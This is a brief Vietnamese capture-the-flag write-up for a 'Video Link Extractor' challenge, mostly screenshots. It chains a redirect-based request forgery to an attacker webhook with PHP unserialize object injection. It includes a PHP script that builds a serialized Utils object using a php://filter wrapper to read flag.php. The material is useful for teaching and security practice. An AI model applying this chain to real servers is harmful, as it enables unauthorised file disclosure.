# Video Link Extractor
+ Khi thực hiện extract localhost trang web thực hiện đoạn code:
![image](https://github.com/vanatka10/he/assets/126310360/06a6dfc9-7f99-45cf-b85e-133d1a181369)



+ Ta có thể lợi dụng tham số id để gọi đến `redirect ` và khiến nó truy cập vào trang web khác 
![image](https://github.com/vanatka10/he/assets/126310360/d1d1bbc5-59cd-4973-8196-c9846cf29866)


![image](https://github.com/vanatka10/he/assets/126310360/99240019-5fe8-46ad-8575-ae7b4323b332)

+ Đã thực hiện get vào trang web của mình
![image](https://github.com/vanatka10/he/assets/126310360/00e8be04-3b72-4837-9186-c7da3e175b6f)



Untrusted data sẽ là response ta trả về, khi đó nó được unserialize  
![image](https://github.com/vanatka10/he/assets/126310360/2c57010e-6e94-4039-bdbd-5323eb58a886)

Thêm vào đó object Utils khi __wakeup sẽ gọi $this->_file  
![image](https://github.com/vanatka10/he/assets/126310360/d689a584-bafa-4ff8-ae11-9cf540ae7f47)

Script tạo serialize data:
```
<?php 
class Utils {
    public $_file = "php://filter/convert.base64-encode/resource=flag.php";
};
echo(serialize(new Utils()));
?>
```
Thay kết quả của script vào response của webhook   
![image](https://github.com/vanatka10/he/assets/126310360/93979176-f09a-4bd9-8c70-64047912397c)


![image](https://github.com/vanatka10/he/assets/126310360/2c0eb3a9-b4ee-4d7c-95de-5a1e0a2902cb)

![image](https://github.com/vanatka10/he/assets/126310360/2d1f02ae-3bb2-410e-b5c6-0faa96ea34d9)

